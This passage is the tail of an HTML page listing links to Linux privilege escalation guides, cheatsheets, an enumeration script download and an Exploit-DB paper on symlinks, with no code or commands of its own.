href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">g0tmi1k - Basic Linux Privilege Escalation</a><br clear="none"/></div><div style="margin: 0.357143em 0px; padding: 0px; font-size: 1em;"><a shape="rect" style="font-size: 1em; color: #0079d3; line-height: 1.42857em;" href="https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562" target="_blank">SANS - Linux Privilege Escalation</a><br clear="none"/></div><div style="margin: 0.357143em 0px; padding: 0px; font-size: 1em;"><a shape="rect" style="font-size: 1em; color: #0079d3; line-height: 1.42857em;" href="https://www.rebootuser.com/?p=1623" target="_blank">Reboot User - Local Linux Enumeration &amp; Privilege Escalation Cheatsheet</a><br clear="none"/></div><div style="margin: 0.357143em 0px; padding: 0px; font-size: 1em;"><a shape="rect" style="font-size: 1em; color: #0079d3; line-height: 1.42857em;" href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank">Security Sift - Linux Privilege Checker - Download link</a><br clear="none"/></div><div style="margin: 0.357143em 0px; padding: 0px; font-size: 1em;"><a shape="rect" style="font-size: 1em; color: #0079d3; line-height: 1.42857em;" href="https://www.rebootuser.com/?p=1758" target="_blank">Reboot User - Bash Script - Linux Enumeration</a><br clear="none"/></div><div style="margin: 0.357143em 0px; padding: 0px; font-size: 1em;"><a shape="rect" style="font-size: 1em; color: #0079d3; line-height: 1.42857em;" href="https://www.exploit-db.com/papers/13199/" target="_blank">Exploit-DB - Crafting Symlinks for Fun and Profit</a><br clear="none"/></div></body></html>